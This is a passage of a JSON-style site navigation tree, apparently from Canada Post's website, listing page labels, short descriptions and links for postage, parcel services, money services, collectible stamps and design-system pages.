                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Mailing prices for domestic and international letters and cards.",
                  
                    "link": "/cpc/en/personal/sending/letters-mail/postage-rates.page?",
                    "linkCMSPage": "personal/sending/letters-mail/postage-rates",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Letter weight and size",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Measurements for standard and oversized or non-standard mail.",
                  
                    "link": "/cpc/en/personal/sending/letters-mail/letter-size.page?",
                    "linkCMSPage": "personal/sending/letters-mail/letter-size",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Register your mail",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Buy Registered Mail™ to get proof your letter was received.",
                  
                    "link": "/cpc/en/personal/sending/letters-mail/registered-mail.page?",
                    "linkCMSPage": "personal/sending/letters-mail/registered-mail",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Create custom stamps",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Design personal stamps for domestic and international mailing.",
                  
                    "link": "/cpc/en/personal/sending/letters-mail/custom-stamps.page?",
                    "linkCMSPage": "personal/sending/letters-mail/custom-stamps",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Parcels",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about different shipping services for packages.",
                  
                    "link": "/cpc/en/personal/sending/parcels.page?",
                    "linkCMSPage": "personal/sending/parcels",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Ship online",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Create, pay for and print a shipping label online.",
                  
                    "link": "/cpc/en/personal/sending/parcels/ship-online.page?",
                    "linkCMSPage": "personal/sending/parcels/ship-online",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Return your purchase",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access and print a return shipping label online.",
                  
                    "link": "/cpc/en/personal/sending/parcels/return-labels.page?",
                    "linkCMSPage": "personal/sending/parcels/return-labels",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "View restrictions",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about non-mailable and controlled item restrictions by country.",
                  
                    "link": "/cpc/en/personal/sending/parcels/restrictions.page?",
                    "linkCMSPage": "personal/sending/parcels/restrictions",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Cannabis",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/restrictions/cannabis.page?",
                    "linkCMSPage": "personal/sending/parcels/restrictions/cannabis",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Firearms",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/restrictions/firearms.page?",
                    "linkCMSPage": "personal/sending/parcels/restrictions/firearms",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Compare shipping services in Canada",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about domestic shipping speeds and features.",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-canada.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-canada",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Regular Parcel",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-canada/regular.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-canada/regular",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Xpresspost",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-canada/xpresspost.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-canada/xpresspost",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Priority",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-canada/priority.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-canada/priority",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Compare international shipping services",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about international shipping speeds and features.",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Small Packet USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/small-packet-usa.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/small-packet-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Small Packet International – Air or Surface",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/small-packet-international.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/small-packet-international",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Xpresspost – International",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/xpresspost-international.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/xpresspost-international",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Xpresspost – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/xpresspost-usa.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/xpresspost-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tracked Packet – International",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-international.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/tracked-packet-international",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tracked Packet – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-usa.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/tracked-packet-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Expedited Parcel – USA",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/expedited-usa.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/expedited-usa",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "International Parcel – Air or Surface",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/international-parcel.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/international-parcel",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Priority Worldwide",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/sending/parcels/compare-services-international/priority-worldwide.page?",
                    "linkCMSPage": "personal/sending/parcels/compare-services-international/priority-worldwide",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Estimate duties and taxes",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/wtz/business/landedCost",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Complete customs form",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/cdc",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Flat rate boxes",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Purchase the box and included postage at the post office, ship anytime.",
                  
                    "link": "/cpc/en/personal/sending/parcels/flat-rate-box.page?",
                    "linkCMSPage": "personal/sending/parcels/flat-rate-box",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Access our quick tools",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about your favourite shipping tools.",
                  
                    "link": "/cpc/en/personal/sending/quick-tools.page?",
                    "linkCMSPage": "personal/sending/quick-tools",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Find a rate",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/far/business/findARate",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a delivery standard",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/tools/delivery-standards.page?",
                    "linkCMSPage": "tools/delivery-standards",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Track a package",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/track-reperage/en",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a post office",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/information/app/fpo/personal/findpostoffice",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Find a postal code",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/info/mc/personal/postalcode/fpc.jsf",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Money and government services",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Money and government services overview",
                 
                    "description": "Learn about money services and permits available at the post office.",
                  
                    "link": "/cpc/en/personal/money-government-services.page?",
                    "linkCMSPage": "personal/money-government-services",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Send money",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about affordable money transfers and cashable money orders.",
                  
                    "link": "/cpc/en/personal/money-government-services/send-money.page?",
                    "linkCMSPage": "personal/money-government-services/send-money",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Money orders",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Send secure, cashable money orders from the post office.",
                  
                    "link": "/cpc/en/personal/money-government-services/send-money/money-orders.page?",
                    "linkCMSPage": "personal/money-government-services/send-money/money-orders",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "International money transfer (MoneyGram)",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Send affordable, international money transfers all over the world.",
                  
                    "link": "/cpc/en/personal/money-government-services/send-money/international-money-transfers.page?",
                    "linkCMSPage": "personal/money-government-services/send-money/international-money-transfers",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Manage money",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about prepaid cards and ordering foreign currency.",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Prepaid reloadable cards",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Buy prepaid cards at the post office for shopping and travel.",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Mastercard",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards/mastercard",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Get to know your card",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/overview.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards/mastercard/overview",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "How to get started",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-to-get-started.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards/mastercard/how-to-get-started",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "How it works",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-it-works.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards/mastercard/how-it-works",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Contact us",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/contact-us.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards/mastercard/contact-us",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "FAQ",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/faq.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-cards/mastercard/faq",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Other prepaid services",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Buy calling cards and mobile recharge cards at the post office.",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/prepaid-services-mobile-recharge.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/prepaid-services-mobile-recharge",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Foreign cash delivery",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Order currency online for delivery to your home or the post office.",
                  
                    "link": "/cpc/en/personal/money-government-services/manage-money/foreign-currency-delivery.page?",
                    "linkCMSPage": "personal/money-government-services/manage-money/foreign-currency-delivery",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Gift cards",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Purchase gift cards at the post office.",
                  
                    "link": "/cpc/en/personal/money-government-services/gift-cards.page?",
                    "linkCMSPage": "personal/money-government-services/gift-cards",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Government forms and permits",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get migratory bird hunting permits at the post office.",
                  
                    "link": "/cpc/en/personal/money-government-services/tax-forms-hunting-permit.page?",
                    "linkCMSPage": "personal/money-government-services/tax-forms-hunting-permit",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Collectible stamps and coins",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Collectible stamps and coins overview",
                 
                    "description": "Learn about collectible stamps and access pictorial cancels.",
                  
                    "link": "/cpc/en/personal/collectibles.page?",
                    "linkCMSPage": "personal/collectibles",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Canadian stamp stories",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Tips and ideas on collecting stamps and coins.",
                  
                    "link": "/cpc/en/personal/collectibles/stamp-stories.page?",
                    "linkCMSPage": "personal/collectibles/stamp-stories",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Details magazine collections catalogue",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/personal/collectibles/stamp-stories/details-magazine-collections-catalogue.page?",
                    "linkCMSPage": "personal/collectibles/stamp-stories/details-magazine-collections-catalogue",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Suggest a stamp",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Send us your stamp theme ideas.",
                  
                    "link": "/cpc/en/personal/collectibles/suggest-stamp.page?",
                    "linkCMSPage": "personal/collectibles/suggest-stamp",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Pictorial cancels",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "View available postal cancels and which post office offers them.",
                  
                    "link": "/cpc/en/personal/collectibles/pictorial-cancels.page?",
                    "linkCMSPage": "personal/collectibles/pictorial-cancels",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Mercury",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "mercury",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Overview",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "overview",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Accessibility",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "accessibility",
                  
                    "link": "/cpc/en/mercury/overview/accessibility.page?",
                    "linkCMSPage": "mercury/overview/accessibility",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Grids",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/overview/grids.page?",
                    "linkCMSPage": "mercury/overview/grids",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Optimizing for search",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/overview/optimizing-for-search.page?",
                    "linkCMSPage": "mercury/overview/optimizing-for-search",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Page Structure",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/overview/page-structure.page?",
                    "linkCMSPage": "mercury/overview/page-structure",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Templates: Campaign page",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/overview/template-campaign-page.page?",
                    "linkCMSPage": "mercury/overview/template-campaign-page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Templates: Product page",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/overview/template-product-page.page?",
                    "linkCMSPage": "mercury/overview/template-product-page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Units and measurements",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/overview/units-measurements.page?",
                    "linkCMSPage": "mercury/overview/units-measurements",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Style",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "style",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Colour",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/style/colour.page?",
                    "linkCMSPage": "mercury/style/colour",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Grammar and mechanics",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "grammar-mechanics",
                  
                    "link": "/cpc/en/mercury/style/grammar-mechanics.page?",
                    "linkCMSPage": "mercury/style/grammar-mechanics",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Iconography",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/style/iconography.page?",
                    "linkCMSPage": "mercury/style/iconography",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Illustration",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/style/illustration.page?",
                    "linkCMSPage": "mercury/style/illustration",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Logo",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/style/logo.page?",
                    "linkCMSPage": "mercury/style/logo",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Photography",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/style/photography.page?",
                    "linkCMSPage": "mercury/style/photography",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Typography",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/style/typography.page?",
                    "linkCMSPage": "mercury/style/typography",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Voice and tone",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "voice-tone",
                  
                    "link": "/cpc/en/mercury/style/voice-tone.page?",
                    "linkCMSPage": "mercury/style/voice-tone",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Components",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "components",
                  
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Accordions",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Accordions",
                  
                    "link": "/cpc/en/mercury/components/accordion.page?",
                    "linkCMSPage": "mercury/components/accordion",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Breadcrumbs",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/breadcrumbs.page?",
                    "linkCMSPage": "mercury/components/breadcrumbs",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Buttons",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/buttons.page?",
                    "linkCMSPage": "mercury/components/buttons",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Checkboxes",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/checkbox.page?",
                    "linkCMSPage": "mercury/components/checkbox",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Date pickers",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/date-picker.page?",
                    "linkCMSPage": "mercury/components/date-picker",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Dropdown menus",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/dropdown.page?",
                    "linkCMSPage": "mercury/components/dropdown",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Forms",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/form.page?",
                    "linkCMSPage": "mercury/components/form",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Input fields",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/input-field.page?",
                    "linkCMSPage": "mercury/components/input-field",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Links",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "links",
                  
                    "link": "/cpc/en/mercury/components/links.page?",
                    "linkCMSPage": "mercury/components/links",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Lists",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/lists.page?",
                    "linkCMSPage": "mercury/components/lists",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Modal",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/modal-window.page?",
                    "linkCMSPage": "mercury/components/modal-window",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Navigation",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/navigation.page?",
                    "linkCMSPage": "mercury/components/navigation",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Notifications",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/notification.page?",
                    "linkCMSPage": "mercury/components/notification",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Pagination",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Pagination",
                  
                    "link": "/cpc/en/mercury/components/pagination.page?",
                    "linkCMSPage": "mercury/components/pagination",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Progress bars",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/progress-bar.page?",
                    "linkCMSPage": "mercury/components/progress-bar",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Radio buttons",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/mercury/components/radio-button.page?",
                    "linkCMSPage": "mercury/components/radio-button",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Search",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/search.page?",
                    "linkCMSPage": "mercury/components/search",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tabs",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/tabs.page?",
                    "linkCMSPage": "mercury/components/tabs",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Toggle",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Toggle",
                  
                    "link": "/cpc/en/mercury/components/toggle.page?",
                    "linkCMSPage": "mercury/components/toggle",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tables",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Tables",
                  
                    "link": "/cpc/en/mercury/components/table.page?",
                    "linkCMSPage": "mercury/components/table",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Tool cards",
                  "visibleInSiteMap": "false",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/mercury/components/tool-card.page?",
                    "linkCMSPage": "mercury/components/tool-card",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Resources",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "resources",
                  
                    "link": "/cpc/en/mercury/resources.page?",
                    "linkCMSPage": "mercury/resources",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Our Company",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about Canada Post and shipping service alerts.",
                  
                    "link": "/cpc/en/our-company.page?",
                    "linkCMSPage": "our-company",
                  
                    "preserveQs": "false",
                  
